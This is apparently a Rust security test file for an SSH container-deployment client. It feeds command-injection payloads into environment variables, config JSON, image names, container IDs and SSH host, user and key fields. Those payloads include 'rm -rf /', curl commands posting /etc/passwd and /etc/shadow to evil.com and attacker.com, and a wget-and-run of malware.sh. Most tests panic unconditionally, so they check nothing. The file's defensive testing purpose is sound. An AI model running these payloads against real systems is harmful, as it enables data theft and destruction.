//! Critical security tests for command injection vulnerabilities
//!
//! These tests demonstrate actual command injection attacks that can be exploited
//! in the SSH deployment system. ALL OF THESE TESTS SHOULD FAIL until fixes are applied.

use blueprint_remote_providers::{
    core::{error::Result, resources::ResourceSpec},
    deployment::ssh::{ContainerRuntime, ResourceLimits, SshConnection, SshDeploymentClient},
};
use std::collections::HashMap;
use std::path::PathBuf;

/// Helper to create a mock SSH client for testing (won't actually connect)
fn create_test_ssh_client() -> SshDeploymentClient {
    let connection = SshConnection {
        host: "test.example.com".to_string(),
        port: 22,
        user: "testuser".to_string(),
        key_path: None,
        jump_host: None,
    };

    SshDeploymentClient::new(connection, ContainerRuntime::Docker)
}

/// CRITICAL VULNERABILITY: Environment variable injection
/// An attacker can inject shell commands through environment variable values
#[tokio::test]
#[should_panic(expected = "Command injection detected")]
async fn test_env_var_command_injection() {
    let client = create_test_ssh_client();

    // Malicious environment variable that attempts command injection
    let mut env_vars = HashMap::new();
    env_vars.insert(
        "NORMAL_VAR".to_string(),
        "'; rm -rf /; echo 'pwned".to_string(), // Command injection payload
    );
    env_vars.insert(
        "ANOTHER_VAR".to_string(),
        "$(curl -X POST http://evil.com/exfiltrate -d \"$(cat /etc/passwd)\")".to_string(),
    );

    let limits = ResourceLimits {
        cpu_cores: Some(2.0),
        memory_mb: Some(2048),
        disk_gb: Some(10),
    };

    // This should detect and prevent the command injection
    // Currently VULNERABLE - the format! macro directly injects these values
    let result = client
        .create_container("test-image:latest", env_vars, limits)
        .await;

    // This test should fail because command injection is not prevented
    panic!("Command injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: Configuration content injection
/// JSON configuration content can contain shell injection payloads
#[tokio::test]
#[should_panic(expected = "Configuration injection detected")]
async fn test_config_content_injection() {
    let client = create_test_ssh_client();

    // Create a blueprint config with malicious JSON content
    let malicious_config = serde_json::json!({
        "blueprint_id": "test'; rm -rf /opt/blueprint; echo 'config_injected",
        "service_url": "http://localhost:8080$(curl -X POST http://evil.com/steal)",
        "auth_token": "'; cat /etc/shadow | base64 | curl -X POST http://attacker.com -d @-; echo '"
    });

    let spec = ResourceSpec {
        cpu: 2.0,
        memory_gb: 4.0,
        disk_gb: 50.0,
    };

    // This creates a shell command with unsanitized JSON content:
    // echo '{malicious_json}' | sudo tee /opt/blueprint/config/blueprint.json
    let result = client
        .deploy_native(&PathBuf::from("/fake/path"), &malicious_config, spec)
        .await;

    panic!("Configuration injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: Container image name injection
/// Container image names are directly injected into shell commands
#[tokio::test]
#[should_panic(expected = "Image name injection detected")]
async fn test_image_name_injection() {
    let client = create_test_ssh_client();

    // Malicious image name that injects shell commands
    let malicious_image = "nginx:latest; curl -X POST http://evil.com/pwned; echo pwned #";

    // This gets injected directly into: docker pull {image}
    let result = client.pull_image(malicious_image).await;

    panic!("Image name injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: Container ID injection in logs
/// Container IDs passed to log streaming can inject commands
#[tokio::test]
#[should_panic(expected = "Container ID injection detected")]
async fn test_container_id_injection() {
    let client = create_test_ssh_client();

    // Malicious container ID that injects shell commands
    let malicious_id =
        "abc123; curl -X POST http://evil.com/logs -d \"$(docker ps -a)\"; echo fake";

    // This gets injected into: docker logs {container_id}
    let result = client.stream_logs(malicious_id, false).await;

    panic!("Container ID injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: SSH command parameter injection
/// SSH connection parameters can be manipulated for command injection
#[tokio::test]
#[should_panic(expected = "SSH parameter injection detected")]
async fn test_ssh_parameter_injection() {
    // Malicious SSH connection with command injection in hostname
    let malicious_connection = SshConnection {
        host: "test.com'; curl http://evil.com/pwned; echo 'fake".to_string(),
        port: 22,
        user: "testuser'; rm -rf /home/*; echo 'fake".to_string(),
        key_path: Some(PathBuf::from("/path/to/key'; cat /etc/passwd | base64; echo 'fake")),
        jump_host: Some("jump.com'; wget http://evil.com/malware.sh -O /tmp/mal.sh && sh /tmp/mal.sh; echo 'fake".to_string()),
    };

    let client = SshDeploymentClient::new(malicious_connection, ContainerRuntime::Docker);

    // Any command execution will inject the malicious parameters
    let result = client.run_remote_command("echo test").await;

    panic!("SSH parameter injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: Resource limit injection
/// Numeric resource limits can contain shell injection
#[tokio::test]
#[should_panic(expected = "Resource limit injection detected")]
async fn test_resource_limit_injection() {
    let client = create_test_ssh_client();

    // These should be numeric but could be manipulated at the source
    let malicious_limits = ResourceLimits {
        cpu_cores: Some(f32::from_bits(0x41414141)), // Potentially corrupted float
        memory_mb: Some(2048),
        disk_gb: Some(10),
    };

    // If these values are ever converted to strings unsafely, injection could occur
    let result = client
        .create_container("test:latest", HashMap::new(), malicious_limits)
        .await;

    panic!("Resource limit injection detected but not prevented!");
}

/// CRITICAL VULNERABILITY: Systemd service template injection
/// The systemd service configuration uses format! with unsanitized input
#[tokio::test]
#[should_panic(expected = "Systemd template injection detected")]
async fn test_systemd_template_injection() {
    let client = create_test_ssh_client();

    // This will be formatted into the systemd limits template
    // CPUQuota={}%, MemoryMax={}M, TasksMax={}
    let spec = ResourceSpec {
        cpu: f32::from_bits(0x7f800000), // NaN value that could cause issues
        memory_gb: f32::INFINITY,        // Infinity value
        disk_gb: 50.0,
    };

    let config = serde_json::json!({
        "blueprint_id": "test",
        "service_url": "http://localhost:8080"
    });

    // The systemd template formatting could be vulnerable to injection
    let result = client
        .deploy_native(&PathBuf::from("/fake/path"), &config, spec)
        .await;

    panic!("Systemd template injection detected but not prevented!");
}

/// Test that demonstrates how actual command execution works (for reference)
#[tokio::test]
#[ignore = "This is for documentation purposes only"]
async fn test_current_vulnerable_behavior() {
    let client = create_test_ssh_client();

    // Current vulnerable code pattern from ssh.rs line 200:
    // docker_cmd.push_str(&format!(" -e {}={}", key, value));

    let mut env_vars = HashMap::new();
    env_vars.insert(
        "TEST".to_string(),
        "'; echo INJECTION_SUCCESS; echo '".to_string(),
    );

    // This would generate:
    // docker create -e TEST='; echo INJECTION_SUCCESS; echo ' ...
    // Which executes the injected command when run via shell

    println!("Current implementation is vulnerable to command injection");
    println!("Environment variables are directly interpolated into shell commands");
    println!("JSON configuration is piped through shell without sanitization");
    println!("Container names, IDs, and image names are not validated");
}
